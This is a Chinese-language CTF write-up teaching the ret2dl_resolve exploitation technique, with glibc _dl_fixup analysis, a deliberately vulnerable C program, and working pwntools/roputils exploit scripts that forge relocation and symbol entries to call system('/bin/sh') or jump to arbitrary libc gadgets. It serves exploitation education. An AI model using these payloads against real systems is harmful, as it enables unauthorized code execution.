#利用dl_resolve执行libc内任意gadget（不需泄露libc地址）

​	分析：0CTF的题目blackhole2，很简单的栈溢出，但是远程不允许回显，所以不能泄露libc_base，不能返回shell。程序本身所含有的gadget有限，所以能不能不泄露libc_base就能使用libc中任意地址的gadget呢？

​	再构造ROP，读取flag，根据爆破flag。

##1.dl_resolve原理

#### （1）节表认识

查看节表命令：readelf -d bof     readelf -S bof

查看JMPREL（.rel.plt）：readelf -r bof

查看SYMTAB（.dynsym）：readelf -s bof

STRTAB——.dynstr  存字符串

SYMTAB——.dynsym   存动态链接符号表，结构如下`Elf32_Sym`：

JMPREL——.rel.plt   函数重定位  存`Elf32_Rel`{r_offset+r_info}（`r_offset`指向got表(.got.plt节全局函数偏移表)地址，`r_info`存偏移——第几个，根据`r_info`来找这个函数在.dynsym中是第几个）

REL——       .rel.dyn  变量重定位

PLTGOT—— .got.plt  常说的GOT表

.plt节 过程链接表，每个函数占0x10字节。过程链接表把位置独立的函数调用重定向到绝对位置。

```c
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;
typedef struct
{
    Elf32_Word st_name;     // Symbol name(string tbl index)  表示在.dynstr中的偏移
    Elf32_Addr st_value;    // Symbol value
    Elf32_Word st_size;     // Symbol size
    unsigned char st_info;  // Symbol type and binding
    unsigned char st_other; // Symbol visibility under glibc>=2.2
    Elf32_Section st_shndx; // Section index
} Elf32_Sym;
```

```c
typedef struct {
    Elf32_Addr r_offset;    // 对于可执行文件，此值为虚拟地址
    Elf32_Word r_info;      // 符号表索引,  r_info高8位表示index，低8位表示条目类型
} Elf32_Rel;

#define ELF32_R_SYM(info) ((info)>>8)
#define ELF32_R_TYPE(info) ((unsigned char)(info))
#define ELF32_R_INFO(sym, type) (((sym)<<8)+(unsigned char)(type))

```

####(2)**call read@plt**的库函数调用过程

第一次调用read时： 

```bash
gdb-peda$ x/3i read   #plt
   0x80482f0 <read@plt>:        jmp    DWORD PTR ds:0x804970c
   0x80482f6 <read@plt+6>:      push   0x0
   0x80482fb <read@plt+11>:     jmp    0x80482e0   #跳到.plt开头！！
gdb-peda$ x/wx 0x804970c   #got表
   0x804970c <read@got.plt>:       0x080482f6
gdb-peda$ x/2i 0x80482e0   #plt[0]，plt开头
   0x80482e0:   push   DWORD PTR ds:0x8049704  
   0x80482e6:   jmp    DWORD PTR ds:0x8049708
```

   （1）jmp read@got.plt会跳回read@plt，将read的重定位偏移（在.rel.plt也就是JMPREL（存{`r_offset`(指向got表)+`r_info`}）中的偏移）压栈，跳到plt[0]也即plt（.plt—plt表，jmp那一块儿）开头（0x80482e0正好和read位置0x80482f0相差0x10），再将(.got.plt+4)（GOT[1]—got表，链接器的标识信息）压栈并跳到**(.got.plt+0x8)（GOT[2]动态连接器中的入口点）**，相当于调用以下函数：

​	_dl_runtime_resolve(link_map, rel_offset);（`link_map`—got[4]，`rel_offset`—JMPREL节，函数地址是got[8]）。

​	_dl_runtime_resolve会完成具体解析、填充结果和调用的工作。(即将真实的write函数地址写入其GOT条目中，随后把控制权交给write函数。)

​    （2）根据rel_offset找到**重定位条目JMPREL**（8字节）：

​    Elf32_Rel * rel_entry = **JMPREL** + rel_offset;

​    （3）再根据rel_entry中的符号表条目编号，得到对应**符号信息结构SYMTAB**（16字节）：

​    Elf32_Sym *sym_entry **=** **SYMTAB**[ELF32_R_SYM(rel_entry**->**r_info)];

​    （4）再找到符号名称。STRTAB

​    char *sym_name **=** **STRTAB **+ sym_entry**->**st_name;

​    （5）最后，根据名称，搜索动态库。找到地址后，填充到.got.plt对应位置，最后调整栈，调用这一解析得到的函数。

####（3）_dl_fixup函数流程

源码，_dl_fixup是在glibc-2.23/elf/dl-runtime.c实现（dl_runtime_resolve函数内部调用了dl_fixup）：

<https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#1l>

```c
59	DL_FIXUP_VALUE_TYPE
60	attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
61	_dl_fixup (
62	# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
63	           ELF_MACHINE_RUNTIME_FIXUP_ARGS,
64	# endif
65	           struct link_map *l, ElfW(Word) reloc_arg)
66	{
67	  const ElfW(Sym) *const symtab
68	    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
69	  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
70	// 1.首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg
71	  const PLTREL *const reloc
72	    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    // 2.然后通过reloc->r_info找到.dynsym中对应的条目
73	  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
74	  const ElfW(Sym) *refsym = sym;
75	  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
76	  lookup_t result;
77	  DL_FIXUP_VALUE_TYPE value;
78	
79	  /* Sanity check that we're really looking at a PLT relocation.  */
    // 3.这里还会检查reloc->r_info的最低位是不是R_386_JUMP_SLOT=7
80	  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
81	
82	   /* Look up the target symbol.  If the normal lookup rules are not
83	      used don't look in the global scope.  */
84	  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
85	    {
86	      const struct r_found_version *version = NULL;
87	
88	      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
89	        {
90	          const ElfW(Half) *vernum =
91	            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
92	          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
93	          version = &l->l_versions[ndx];
94	          if (version->hash == 0)
95	            version = NULL;
96	        }
97	
98	      /* We need to keep the scope around so do some locking.  This is
99	         not necessary for objects which cannot be unloaded or when
100	         we are not using any threads (yet).  */
101	      int flags = DL_LOOKUP_ADD_DEPENDENCY;
102	      if (!RTLD_SINGLE_THREAD_P)
103	        {
104	          THREAD_GSCOPE_SET_FLAG ();
105	          flags |= DL_LOOKUP_GSCOPE_LOCK;
106	        }
107	
108	#ifdef RTLD_ENABLE_FOREIGN_CALL
109	      RTLD_ENABLE_FOREIGN_CALL;
110	#endif
111	// 4.接着通过strtab+sym->st_name找到符号表字符串，result为libc基地址
112	      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
113	                                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
114	
115	      /* We are done with the global scope.  */
116	      if (!RTLD_SINGLE_THREAD_P)
117	        THREAD_GSCOPE_RESET_FLAG ();
118	
119	#ifdef RTLD_FINALIZE_FOREIGN_CALL
120	      RTLD_FINALIZE_FOREIGN_CALL;
121	#endif
122	
123	      /* Currently result contains the base load address (or link map)
124	         of the object that defines sym.  Now add in the symbol
125	         offset.  */
    // 5.value为libc基址加上要解析函数的偏移地址，也即实际地址
126	      value = DL_FIXUP_MAKE_VALUE (result,
127	                                   SYMBOL_ADDRESS (result, sym, false));
128	    }
129	  else
130	    {
131	      /* We already found the symbol.  The module (and therefore its load
132	         address) is also known.  */
133	      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
134	      result = l;
135	    }
136	
137	  /* And now perhaps the relocation addend.  */
138	  value = elf_machine_plt_value (l, reloc, value);
139	
140	  if (sym != NULL
141	      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
142	    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
143	
144	  /* Finally, fix up the plt itself.  */
145	  if (__glibc_unlikely (GLRO(dl_bind_not)))
146	    return value;
147	// 6.最后把value写入相应的GOT表条目中
148	  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
149	}
```

​	主要流程如下：

```c
_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)
{
    // 1.首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg
    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    // 2.然后通过reloc->r_info找到.dynsym中对应的条目
    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
    // 3.这里还会检查reloc->r_info的最低位是不是R_386_JUMP_SLOT=7
    assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
    // 4.接着通过strtab+sym->st_name找到符号表字符串，result为libc基地址
    result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);
    // 5.value为libc基址加上要解析函数的偏移地址，也即实际地址
    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
    // 6.最后把value写入相应的GOT表条目中
    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}
```

####（4）利用libc中的gadget

​	可以在源码中看到，在**第3步**之后，当.dynsym节中Elf32_Sym结构的st_other值为非0时，会进入另一个不常见的分支，最终跳到（l->l_addr+sym->st_value）。

```c
/* Look up the target symbol.  If the normal lookup rules are not
	      used don't look in the global scope.  */
if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
{
}
else
{
	/* We already found the symbol.  The module (and therefore its load
	  address) is also known.  */
	value = DL_FIXUP_MAKE_VALUE (l, l->l_addr+sym->st_value);
	result = l;
}
```

​	说明：l是link_map结构，link_map结构第一个变量就是l_addr。（应该没有检查，伪造的话）。以下是解析read地址时跳到got[8]时的link_map结构，可见l_addr==0：

![link_map](/Users/john/Desktop/CTF/我的pwn题/12dl_resolve/test/dl_resolve_64/picture/link_map.png)

#####利用方法：

​	1.可以伪造link_map结构。

​	2.使l_addr或st_value其中之一恰好落到某个地址解析已完成的GOT表处，另一个变量设置为可控偏移。

​	3.这样就能跳到libc中任意地址（libc_func+offset）。

​	4.我们可以利用libc中任意gadget。

##2. 32位dl_resolve

#### （1）32位dl_resolve构造模板

​	参见代码**stage6_original.py**

​	漏洞代码：

```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}
int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```

​	利用步骤：

​		1.控制`eip`为PLT[0]的地址，只需传递一个`index_arg`参数 

​		2.控制`index_arg`的大小，使`reloc`的位置落在可控地址内 

​		3.伪造`reloc`的内容，使`sym`落在可控地址内 

​		4.伪造`sym`的内容，使`name`落在可控地址内 

​		5.伪造`name`为任意库函数，如`system`

​	利用第一阶段：

​		把rop写入bss段，劫持栈并跳转过去。

```python
#!/usr/bin/python

from pwn import *
elf = ELF('bof')
offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

r = process('./bof')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = 'A' * offset
payload += p32(read_plt) # 读100个字节到base_stage
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
payload += p32(base_stage)
payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
r.sendline(payload)
```

​	利用第2阶段：

```python
cmd = "/bin/sh"
plt_0 = 0x08048380   # objdump -d -j .plt bof
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
dynsym = 0x080481d8  #readelf -d bof     readelf -S bof
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)# 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr   #fake_sym（Elf32_Sym结构体）大小0x10
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += "system\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
```

​	固定模板，需要修改所有出现的地址。

####（2）32位roputils库使用 

​	参见代码**stage6_roputils.py**

​	代码如下：

```python
#!/usr/bin/python
#coding:utf-8

import roputils
from pwn import *
#只需确定文件名+溢出偏移。roputils.py文件要放到同一目录下
fpath = './bof'
offset = 112

rop = roputils.ROP(fpath)
addr_bss = rop.section('.bss')

buf = rop.retfill(offset)
buf += rop.call('read', 0, addr_bss, 100)
buf += rop.dl_resolve_call(addr_bss+20, addr_bss)

p=process(fpath)
print p.recv()
p.send(p32(len(buf)) + buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)

p.send(buf)
p.interactive()
```

####（3）32位执行libc任意gadget

​	首先看看正常的Elf32_Sym结构（read）：

```c
typedef struct
{
    Elf32_Word st_name;     // Symbol name(string tbl index)  表示在.dynstr中的偏移
    Elf32_Addr st_value;    // Symbol value
    Elf32_Word st_size;     // Symbol size
    unsigned char st_info;  // Symbol type and binding
    unsigned char st_other; // Symbol visibility under glibc>=2.2
    Elf32_Section st_shndx; // Section index
} Elf32_Sym;
```

​	如下可见read函数的结构的值和参数意义：

![JMPREL-SYMTAB](/Users/john/Desktop/CTF/我的pwn题/12dl_resolve/test/dl_resolve_64/picture/JMPREL-SYMTAB.png)

![JMPREL-SYMTAB2](/Users/john/Desktop/CTF/我的pwn题/12dl_resolve/test/dl_resolve_64/picture/JMPREL-SYMTAB2.png)

​	目标：执行libc-2.23.so中的gadget 0x8fa05 : cmp byte ptr [eax], dl ; pop edi ; ret。

​	方法：伪造symtab条目，对比可知：

> fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
>
> fake_sym = p32(0) + p32(fake_st_value) + p32(0) + p32(0x__1__12)

​		libc.symbos['__libc_start_main']=0x18540

​		fake_st_value=0x8fa05-0x18540=0x774C5

​		fake_link_map=elf.got['__libc_start_main']=0x0804A018	

​		st_name不需要管。	

​	问题：如何伪造link_map?

​		伪造的link_map地址是libc_start_main的GOT表地址。通过跟踪dl_fixup 函数发现，dl_fixup引用了link_map+0x34/0x38/0x7c处的3个值来寻找STRTAB/SYMTAB/JMPREL这3个表。 

​	解决：提前往link_map+0x34/0x38/0x7c写入有效值。

​		有两种方法：

#####方法1——3个值不变 	 

​	代码可参考**stage6_libc1.py**。 

​	其实就是 x/100xw  GOT[4]即可发现3个偏移处原本的值，利用read把3个值写到对应偏移处。

#####![success1](/Users/john/Desktop/CTF/我的pwn题/12dl_resolve/test/dl_resolve_64/picture/success1.png)

#####方法2——3个值构造

​	代码可参考**stage6_libc2.py**。

​	把link_map+0x34/0x38/0x7c处的值记作val_0x34，val_0x38，val_0x7c，也即[link_map+0x34/0x38/0x7c]。跟踪发现，是这样寻找的：

> [val_0x34+4]==STRTAB    dynstr
>
> [val_0x38+4]==SYMTAB   dynsym
>
> [val_0x7c+4]==JMPREL      rel_plt	

 	可以把dynstr、dynsym、rel_plt这3个地址都设置为同一个值base_stage（val_0x34=val_0x38=val_0x7c=base_stage+80-4，[base_stage+80]=base_stage），这样布置bss段伪造栈就更简洁。



## 3.64位dl_resolve

####（1）原理

​	区别：结构体变化 & 寄存器传参。

#####1.64位relocation entry的结构体定义如下（24 bytes）：

```c
typedef __u16   Elf64_Half;
typedef __u32   Elf64_Word;
typedef __u64   Elf64_Addr;
typedef __u64   Elf64_Xword;
typedef __s64   Elf64_Sxword;

typedef struct elf64_rela {
  Elf64_Addr r_offset;  /* Location at which to apply the action */
  Elf64_Xword r_info;   /* index and type of relocation */
  Elf64_Sxword r_addend;    /* Constant addend used to compute value */
} Elf64_Rela;
#define ELF64_R_SYM(i) ((i) >> 32) #define ELF64_R_TYPE(i) ((i) & 0xffffffff)
```

```python
#roputils中，64位下构造伪Elf64_Rela的代码如下
...
        r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
...
        buf += struct.pack('<QQQ', base, r_info, 0)                  # Elf64_Rela
```

​	注意，这里r_offset、r_info、r_addend都变成了8字节长度，r_info中分4+4字节。

#####2.`SYMTAB`中的条目定义（24 bytes）

​	可以看到，st_info和st_other等的位置提前了。

```c
typedef struct elf64_sym {
  Elf64_Word st_name;       /* Symbol name, index in string tbl */  //4
  unsigned char st_info;    /* Type and binding attributes */       //1
  unsigned char st_other;   /* No defined meaning, 0 */             //1
  Elf64_Half st_shndx;      /* Associated section index */          //2
  Elf64_Addr st_value;      /* Value of the symbol */               //8
  Elf64_Xword st_size;      /* Associated symbol size */            //8
} Elf64_Sym;
```

```python
#roputils中，伪造SYMTAB条目代码：
buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym
```

##### 3.参数传递

```c
//read@plt
.plt:00000000004005C0 _read           proc near               ; CODE XREF: vuln+3E↓p
.plt:00000000004005C0                 jmp     cs:off_601038
.plt:00000000004005C6                 push    4
.plt:00000000004005CB                 jmp     sub_400570
//plt[0]
.plt:0000000000400570                 push    cs:qword_601008
.plt:0000000000400576                 jmp     cs:qword_601010
//GOT[0]
.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400570↑r
.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400570+6↑r
.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r
```

​	可以看到，给`_dl_runtime_resolve`传递的参数仍然是两个，但第二个参数已由之前32位的相对`JMPREL`的偏移变为该条目的在数组中的index。（除以24）

​	另外，注意到给`_dl_runtime_resolve`传递参数的方式，依然是通过栈，而非一般情况下通过寄存器传递。这是因为此时的寄存器`rdi`等中已经存有要解析的函数所需的参数了。我们需提前将`/bin/sh`地址等参数放在寄存器中。

#####4.在解析函数地址之前，将`link_map+0x1c8`处设为`NULL`。

​	对应的检测代码如下：

```c
/* Look up the target symbol. If the normal lookup rules are not used don't look in the global scope. */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
    {
      const ElfW(Half) *vernum =
        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
      version = &l->l_versions[ndx];
      if (version->hash == 0)
        version = NULL;
    }
```

​	这里，应该是由于我们构造的伪symbol的index过大，使得`vernum[ELFW(R_SYM) (reloc->r_info)]`读取出错。所以只需令`l->l_info[VERSYMIDX (DT_VERSYM)] == NULL`，也即将`link_map+0x1c8`处设为`NULL`。

​	所以，需先泄露GOT[8]，再修改*(GOT[8]+0x1c8)==null。

####（2）64位dl_resolve构造模板

​	参见代码stage6_original.py。

​	主要4点变化：JMPREL条目构造、SYMTAB条目构造、JMPREL偏移参数->下标、link_map+0x1c8处写0。

####（3）64位roputils库使用

​	参见代码dl-resolve-x86-64.py。

步骤：

> 1.泄露&link_map地址（万能gadget）
>
> 2.往bss段写入ROP链和伪造的结构（万能gadget）
>
> 3.跳到bss段，bss段ROP先往link_map+0x1c8写0; 同时往bss段写入伪造结构。

####（4）64位执行libc任意gadget

​	目标：执行libc-2.23.so中的gadget 0x8eb46 : cmp byte ptr [rax], dl ; ret。

​	方法：伪造symtab条目，对比可知：

> fake_sym = p32(st_name) + p32(0x12) + p64(0) + p64(0)
>
> fake_sym = p32(0) + p32(0x__1__12) + p64(fake_st_value) + p64(0) 

​		libc.symbos['__libc_start_main']=0x20740

​		fake_st_value=0x8eb46-0x20740=0x6E406

​		fake_link_map=elf.got['__libc_start_main']=0x601038	

​		st_name不需要管。	

​	问题1：如何伪造link_map?

​		伪造的link_map地址是libc_start_main的GOT表地址。通过跟踪dl_fixup 函数发现，dl_fixup引用了link_map+0x68/0x70/0xf8处的3个值来寻找STRTAB/SYMTAB/JMPREL这3个表。 

​	解决1：提前往link_map+0x68/0x70/0xf8写入有效值。

​		有两种方法。

​	问题2：l_addr+r_offset处必须可写。

​	解决2：l_addr这里的值是libc_start_main 地址，那么我们可以控制好r_offset即可。r_offset=libc['.bss']-libc.symbols['libc_start_main']。

##### 方法1——3个值不变 

​	代码可参考**stage6_libc1_64.py**。 

​	其实就是 x/100xw  GOT[8]即可发现3个偏移处原本的值，利用read把3个值写到对应偏移处。

##### ![success64_1](/Users/john/Desktop/CTF/我的pwn题/12dl_resolve/test/dl_resolve_64/picture/success64_1.png)

##### 方法2——3个值构造

​	代码可参考**stage6_libc2_64.py**。

​	把link_map+0x68/0x70/0xf8处的值记作val_0x68，val_0x70，val_0xf8，也即[link_map+0x68/0x70/0xf8]。跟踪发现，是这样寻找的：

> [val_0x68+4]==STRTAB    dynstr
>
> [val_0x70+4]==SYMTAB   dynsym
>
> [val_0xf8+4]==JMPREL      rel_plt	

 	可以把dynstr、dynsym、rel_plt这3个地址都设置为同一个值base_stage（val_0x68=val_0x70=val_0xf8=base_stage+0xc0-8，[0xc0]=base_stage），这样布置bss段伪造栈就更简洁。



###参考：

<http://pwn4.fun/2016/11/09/Return-to-dl-resolve/>

<http://rk700.github.io/2015/08/09/return-to-dl-resolve/>


